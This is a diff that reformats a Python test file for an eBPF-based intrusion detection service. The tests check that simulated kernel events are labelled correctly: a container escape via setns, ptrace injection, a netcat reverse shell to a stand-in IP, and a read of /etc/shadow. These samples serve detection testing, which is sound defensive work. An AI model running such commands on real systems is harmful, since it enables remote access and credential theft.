@@ -42,14 +42,16 @@ def test_container_escape_and_ptrace_detection():
     service = EBPFAgentService()
 
     # 1. Container escape attempt
-    escape_event = service.ingest_kernel_event({
-        "syscall": "sys_enter_setns",
-        "comm": "runc",
-        "pid": 7781,
-        "ppid": 1200,
-        "container_id": "c-compromised-worker",
-        "args": ["setns", "/proc/1/ns/mnt", "CLONE_NEWNS"],
-    })
+    escape_event = service.ingest_kernel_event(
+        {
+            "syscall": "sys_enter_setns",
+            "comm": "runc",
+            "pid": 7781,
+            "ppid": 1200,
+            "container_id": "c-compromised-worker",
+            "args": ["setns", "/proc/1/ns/mnt", "CLONE_NEWNS"],
+        }
+    )
 
     assert escape_event["severity"] == "CRITICAL"
     assert "CONTAINER_ESCAPE_ATTEMPT" in escape_event["threat_label"]
@@ -59,14 +61,16 @@ def test_container_escape_and_ptrace_detection():
     assert escape_event["is_quarantined"] is True
 
     # 2. Process memory injection via ptrace
-    ptrace_event = service.ingest_kernel_event({
-        "syscall": "sys_enter_ptrace",
-        "comm": "inject_tool",
-        "pid": 8812,
-        "ppid": 1,
-        "container_id": "host",
-        "args": ["PTRACE_ATTACH", "target_pid:1042"],
-    })
+    ptrace_event = service.ingest_kernel_event(
+        {
+            "syscall": "sys_enter_ptrace",
+            "comm": "inject_tool",
+            "pid": 8812,
+            "ppid": 1,
+            "container_id": "host",
+            "args": ["PTRACE_ATTACH", "target_pid:1042"],
+        }
+    )
 
     assert ptrace_event["severity"] == "CRITICAL"
     assert "PROCESS_MEMORY_INJECTION" in ptrace_event["threat_label"]
@@ -79,24 +83,28 @@ def test_reverse_shell_and_credential_access():
     service = EBPFAgentService()
 
     # 1. Reverse shell
-    rev_shell = service.ingest_kernel_event({
-        "syscall": "sys_enter_execve",
-        "comm": "nc",
-        "pid": 9102,
-        "container_id": "c-web",
-        "args": ["nc", "-e", "/bin/sh", "198.51.100.44", "4444"],
-    })
+    rev_shell = service.ingest_kernel_event(
+        {
+            "syscall": "sys_enter_execve",
+            "comm": "nc",
+            "pid": 9102,
+            "container_id": "c-web",
+            "args": ["nc", "-e", "/bin/sh", "198.51.100.44", "4444"],
+        }
+    )
     assert rev_shell["severity"] == "HIGH"
     assert "INTERACTIVE_REVERSE_SHELL" in rev_shell["threat_label"]
 
     # 2. Shadow file read
-    shadow_read = service.ingest_kernel_event({
-        "syscall": "sys_enter_openat",
-        "comm": "cat",
-        "pid": 9103,
-        "container_id": "c-web",
-        "args": ["openat", "AT_FDCWD", "/etc/shadow", "O_RDONLY"],
-    })
+    shadow_read = service.ingest_kernel_event(
+        {
+            "syscall": "sys_enter_openat",
+            "comm": "cat",
+            "pid": 9103,
+            "container_id": "c-web",
+            "args": ["openat", "AT_FDCWD", "/etc/shadow", "O_RDONLY"],
+        }
+    )
     assert shadow_read["severity"] == "HIGH"
     assert "SENSITIVE_CREDENTIAL" in shadow_read["threat_label"]
 
@@ -104,13 +112,15 @@ def test_reverse_shell_and_credential_access():
 def test_telemetry_stream_filtering():
     """Verify retrieval and severity filtering of kernel telemetry stream."""
     service = EBPFAgentService()
-    service.ingest_kernel_event({
-        "syscall": "sys_enter_execve",
-        "comm": "python3",
-        "pid": 111,
-        "args": ["python3", "safe.py"],
-        "severity": "INFO",
-    })
+    service.ingest_kernel_event(
+        {
+            "syscall": "sys_enter_execve",
+            "comm": "python3",
+            "pid": 111,
+            "args": ["python3", "safe.py"],
+            "severity": "INFO",
+        }
+    )
 
     all_events = service.get_telemetry_stream(limit=10, severity_filter="ALL")
     assert len(all_events) > 0
@@ -147,7 +157,9 @@ async def test_ebpf_fastapi_endpoints():
     """Verify FastAPI /ebpf endpoints with token authentication."""
     transport = ASGITransport(app=app)
     async with AsyncClient(transport=transport, base_url="http://test") as client:
-        token = create_access_token({"sub": "ciso@enterprise.com", "role": "admin", "org": "corp-grid"})
+        token = create_access_token(
+            {"sub": "ciso@enterprise.com", "role": "admin", "org": "corp-grid"}
+        )
         auth_headers = {"Authorization": f"Bearer {token}"}
 
         # 1. Unauthenticated request should be rejected
@@ -186,4 +198,3 @@ async def test_ebpf_fastapi_endpoints():
         )
         assert quar_res.status_code == 200
         assert quar_res.json()["quarantine"]["status"] == "CONTAINED_AND_ISOLATED"
-
